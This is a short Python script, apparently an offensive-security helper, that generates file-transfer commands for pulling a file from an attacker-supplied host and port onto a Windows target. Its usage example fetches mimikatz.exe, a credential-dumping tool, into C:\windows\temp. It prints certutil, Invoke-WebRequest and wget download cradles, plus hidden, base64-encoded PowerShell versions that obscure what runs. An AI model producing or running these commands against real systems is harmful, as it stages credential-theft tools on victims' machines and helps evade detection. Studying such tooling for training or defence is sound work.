import sys
import base64

if len(sys.argv) != 6:
        print("Usage: python3 mycode.py <LHOST> <LPORT> <command> <file> <outputPath>")
        print("Ex: python3 mycode.py 192.168.45.1 8000 certutil mimikatz.exe C:\\windows\\temp\\mik.exe")
        sys.exit(1)

command = sys.argv[3]
ip_addr = sys.argv[1]
port = sys.argv[2]
myfile = sys.argv[4]
outpath = sys.argv[5]

if command == "certutil":
        print(f"certutil -urlcache -split -f http://{ip_addr}:{port}/{myfile} {outpath}")

elif command == "iwr":
        payload = f"iwr -Uri http://{ip_addr}:{port}/{myfile} -Outfile {outpath}"
        print(f"iwr -Uri http://{ip_addr}:{port}/{myfile} -Outfile {outpath}")
        print(f"powershell -c \"iwr -Uri http://{ip_addr}:{port}/{myfile} -Outfile {outpath}\"")
        print(f"powershell -nop -w hidden -e {base64.b64encode(payload.encode('utf16')[2:]).decode()}")

elif command == "wget":
        payload = f"wget http://{ip_addr}:{port}/{myfile} -O {outpath}"
        print(f"wget http://{ip_addr}:{port}/{myfile} -O {outpath}")
        print(f"powershell -c \"wget http://{ip_addr}:{port}/{myfile} -O {outpath}\"")
        print(f"powershell -nop -w hidden -e {base64.b64encode(payload.encode('utf16')[2:]).decode()}")
